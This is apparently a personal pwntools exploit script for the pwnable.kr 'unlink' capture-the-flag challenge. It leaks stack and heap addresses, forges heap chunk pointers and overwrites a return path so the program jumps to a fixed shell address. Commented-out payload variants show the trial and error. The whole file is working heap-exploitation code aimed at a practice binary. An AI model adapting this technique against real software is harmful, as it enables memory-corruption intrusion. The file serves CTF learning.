from pwn import *
import re
import binascii
hexre = "0x[a-zA-Z0-9]*"
r = re.compile(hexre)

def get_hex_in_next_line(output_pipe, r) -> int:
    line = output_pipe.readline().decode()
    print(f"Raw Line: {line}")
    m = r.search(line)
    print(f"Found: {m.group(0)}")
    address = int(m.group(0), 16)
    return address

#gen = util.cyclic.cyclic_gen()
#pattern = gen.get(100)
#g = gdb.debug("/home/jordan/ctf/pwnable.kr/unlink/unlink", '''
#''')
s = ssh(host='localhost', port=2020, user='unlink', password='guest')
g = s.process(['./unlink'])
#g = process(['./unlink'])

stack_address = get_hex_in_next_line(g, r)
#stack_address = stack_address + 0x0c
stack_address = stack_address + 0x0c
print(f"Stack Address: 0x{stack_address:02X}")
#stack_line = g.readline().decode()
#m = r.search(stack_line)
#print(m.group(0))
#stack_address = int(m.group(0), 16) - 0x1c
stack_bytes = stack_address.to_bytes(4, 'little', signed=False)

heap_address = get_hex_in_next_line(g, r) + 0xc
heap_bytes = heap_address.to_bytes(4, 'little', signed=False)
print(g.readline())

target_address = 0x080484eb.to_bytes(4, 'little', signed=False)

#pattern = b"aaaabaaacaaadaaaeaaafaaa" + b"\x41\x41\x41\x41" + b"\x42\x42\x42\x42iaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa"
# b->fd / b + 0 = stack_bytes / C
# b->bk / b + 4 = heap_bytes / A
# *(heap_bytes) = stack_bytes / A->fw = C
# *(stack_bytes) = heap_bytes
#pattern = target_address + b"baaacaaadaaaeaaafaaa" + stack_bytes + heap_bytes 
pattern = target_address + b"baaacaaadaaa" + stack_bytes + heap_bytes 

#pattern = stack_bytes + b"baaacaaadaaaeaaafaaa" + target_address + heap_bytes + b"iaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa"
# target_address = *(heap_bytes + 4)
#pattern = stack_bytes + b"baaacaaadaaaeaaafaaa" + target_address + heap_bytes + b"iaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa"
#pattern = stack_bytes + b"baaacaaadaaaeaaafaaa" + stack_bytes + target_address + b"iaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa"
#pattern = b"abcdefg"

print(f"Heap Address: 0x{heap_address:02X}")

print(binascii.hexlify(pattern))
g.sendline(pattern)
g.interactive()

#g.sendlines(pattern)

